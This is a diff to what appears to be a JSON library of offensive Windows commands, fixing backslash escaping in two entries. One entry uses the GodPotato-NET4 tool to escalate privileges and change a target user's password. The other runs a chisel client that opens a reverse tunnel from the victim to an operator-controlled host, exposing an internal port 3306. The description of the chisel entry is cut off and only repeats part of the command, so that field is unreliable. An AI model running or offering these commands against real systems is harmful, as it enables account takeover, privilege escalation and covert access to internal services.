@@ -39,7 +39,7 @@
   "privilege_escalation": [
     {
       "os": "Windows",
-      "cmd": ".\GodPotato-NET4.exe -cmd \"cmd /c net user {USER} {NEW_PASS}\"",
+      "cmd": ".\\GodPotato-NET4.exe -cmd \"cmd /c net user {USER} {NEW_PASS}\"",
       "description": "Execute the GodPotato-NET4.exe tool to change a target user's password with elevated privileges."
     },
     {
@@ -100,8 +100,8 @@
     },
     {
       "os": "Windows",
-      "cmd": ".\chisel.exe client -v {LHOST}: R:{LPORT}:{RHOST}:{RPORT}",
-      "description": ".\chisel.exe client -v {LHOST}: R:3306:127.0.0.1:{"
+      "cmd": ".\\chisel.exe client -v {LHOST}: R:{LPORT}:{RHOST}:{RPORT}",
+      "description": ".\\chisel.exe client -v {LHOST}: R:3306:127.0.0.1:{"
     }
   ],
   "credential_and_ad_management": [
